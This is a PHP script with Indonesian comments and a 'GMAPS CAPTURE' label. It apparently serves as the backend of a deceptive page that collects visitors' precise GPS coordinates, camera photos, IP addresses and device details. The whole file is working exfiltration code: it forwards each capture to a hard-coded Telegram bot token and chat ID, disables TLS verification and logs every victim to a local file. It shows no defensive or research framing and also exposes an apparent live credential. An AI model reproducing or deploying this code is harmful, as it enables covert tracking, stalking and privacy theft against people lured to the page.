<?php
// ====== KONFIGURASI ======
$BOT_TOKEN = '8989976718:AAFBWh90mRnw6VOYrjrMDhUl2TfTApELsHA';
$CHAT_ID   = '8763088511';
$DEBUG     = true;

// ====== TERIMA DATA ======
$raw = file_get_contents('php://input');
$data = json_decode($raw, true);

if (!$data) {
    http_response_code(400);
    echo 'invalid json';
    exit;
}

$type = $data['type'] ?? 'unknown';
$ua = $data['ua'] ?? ($_SERVER['HTTP_USER_AGENT'] ?? '-');
$ip = $_SERVER['REMOTE_ADDR'] ?? '-';
$time = date('Y-m-d H:i:s');

// ====== SUSUN PESAN ======
$msg = "=== GMAPS CAPTURE ===\n";
$msg .= "Tipe: $type\n";
$msg .= "Waktu: $time\n";
$msg .= "IP: $ip\n";
$msg .= "UA: $ua\n";

if ($type === 'location') {
    $msg .= "Lat: " . $data['lat'] . "\n";
    $msg .= "Lng: " . $data['lng'] . "\n";
    $msg .= "Akurasi: " . ($data['accuracy'] ?? '-') . " m\n";
    $msg .= "Maps: https://maps.google.com/?q=" . $data['lat'] . "," . $data['lng'] . "\n";
} elseif ($type === 'location_denied') {
    $msg .= "Error: " . ($data['error'] ?? '-') . "\n";
} elseif ($type === 'camera_photo') {
    $msg .= "Foto kamera terlampir.\n";
} elseif ($type === 'camera_denied') {
    $msg .= "Error: " . ($data['error'] ?? '-') . "\n";
} elseif ($type === 'visit') {
    $msg .= "Platform: " . ($data['platform'] ?? '-') . "\n";
    $msg .= "Bahasa: " . ($data['language'] ?? '-') . "\n";
    $msg .= "Layar: " . ($data['screen'] ?? '-') . "\n";
}

// ====== FUNGSI KIRIM TELEGRAM ======
function tg_send($token, $method, $params) {
    global $DEBUG;
    $url = "https://api.telegram.org/bot$token/$method";

    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        $res = curl_exec($ch);
        $err = curl_error($ch);
        curl_close($ch);
        if ($DEBUG) error_log("TG curl: $res | err: $err");
        return $res;
    }

    $opts = [
        'http' => [
            'method' => 'POST',
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($params),
            'timeout' => 30,
        ],
        'ssl' => [
            'verify_peer' => false,
            'verify_peer_name' => false,
        ],
    ];
    $ctx = stream_context_create($opts);
    $res = @file_get_contents($url, false, $ctx);
    if ($DEBUG) error_log("TG fgc: $res");
    return $res;
}

// ====== KIRIM ======
$result = '';
if ($type === 'camera_photo' && !empty($data['image'])) {
    $img = $data['image'];
    if (strpos($img, ',') !== false) {
        $img = explode(',', $img)[1];
    }
    $binary = base64_decode($img);
    $tmp = sys_get_temp_dir() . '/cam_' . uniqid() . '.jpg';
    file_put_contents($tmp, $binary);

    $result = tg_send($BOT_TOKEN, 'sendPhoto', [
        'chat_id' => $CHAT_ID,
        'photo' => new CURLFile($tmp),
        'caption' => $msg,
    ]);
    @unlink($tmp);
} else {
    $result = tg_send($BOT_TOKEN, 'sendMessage', [
        'chat_id' => $CHAT_ID,
        'text' => $msg,
    ]);
}

// ====== LOG ======
file_put_contents('log.txt', $msg . "\nRESULT: $result\n---\n", FILE_APPEND | LOCK_EX);

// ====== RESPONS ======
header('Content-Type: application/json');
echo json_encode(['ok' => true, 'type' => $type, 'result' => $result]);
?>
